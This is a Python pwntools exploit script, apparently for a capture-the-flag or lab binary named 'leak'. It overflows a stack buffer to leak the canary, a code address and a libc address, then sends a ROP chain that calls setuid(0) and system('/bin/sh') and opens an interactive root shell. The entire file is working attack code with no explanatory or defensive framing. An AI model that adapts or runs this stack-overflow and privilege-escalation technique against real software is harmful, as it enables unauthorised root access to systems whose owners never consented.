#!/bin/python3

from pwn import *

POPRDI = 0x6a

SYSTEM = 0x222bb
BINSH = 0x16403d
EXIT = 0x17b0b
SETUID = 0xa4e2b

CANARYOSET = 104

def leak_by_overwrite(payload:bytes, target:object) -> bytes:

    ## send payload
    target.send(payload)

    ## clear echo
    target.recvuntil(payload)

    ## get leak
    response = target.recv(timeout=2)

    return response

def main():

    ## start process
    target = process("./leak")

#    target = process(["strace", "-o", "strace.out", "./leak"])   # FOR REFERENCE

    ## payload 1, overwrite canary null byte
    p1 = b"A" * (CANARYOSET+1)

    ## get canary leak
    canary = b'\x00' + leak_by_overwrite(p1, target)[:7]
    log.success(f"leaked canary : {hex(u64(canary))}")

    ## payload 2, overwrite canary and base pointer
    p2 = p1 +  b"A"*15

    ## get .text leak
    ret_addr = u64(leak_by_overwrite(p2, target)[:6] + b"\x00\x00")
    log.success(f"leaked return address : {hex(ret_addr)}")

    ## payload 3, overwrite return address and NULL 
    p3 = p2 + b"A"*16

    ## leak libc
    libc_leak = u64(leak_by_overwrite(p3, target)[:6] + b"\x00\x00")
    log.success(f"leaked libc address   : {hex(libc_leak)}")

    ## calculate real addresses
    pop_rdi = ret_addr + POPRDI
    sys = libc_leak + SYSTEM
    libc_exit = libc_leak + EXIT
    binsh = libc_leak + BINSH
    setuid = libc_leak + SETUID
    print()
    log.info(f"\tpop rdi; ret address : {hex(pop_rdi)}")
    log.info(f"\tsystem() address     : {hex(sys)}")
    log.info(f"\texit() address       : {hex(libc_exit)}")
    log.info(f"\tsetuid() address     : {hex(setuid)}")
    log.info(f"\t'/bin/sh' address    : {hex(binsh)}")
    print()

    ## create ROP chain
    payload = b"A"*CANARYOSET    # buffer
    payload += canary            # canary to prevent stackcheck
    payload += b"A"*8            # overwrite base pointer

    payload += p64(pop_rdi)      # rdi <-|
    payload += p64(0)            # 0 ----|
    payload += p64(setuid)       # setuid(0) (if setuid binary)

    payload += p64(pop_rdi)      # rdi <------|
    payload += p64(binsh)        # "/bin/sh" -|
    payload += p64(sys)          # system("/bin/sh")

    payload += p64(pop_rdi)      # rdi <-|
    payload += p64(0)            # 0 ----|
    payload += p64(libc_exit)    # exit(0) for clean exit

    ## send final payload
    target.send(payload)

    ## send "q" to terminate loop
    target.send(b"q")

    ## shell
    target.clean()
    target.interactive()


if __name__ == "__main__":
    main()

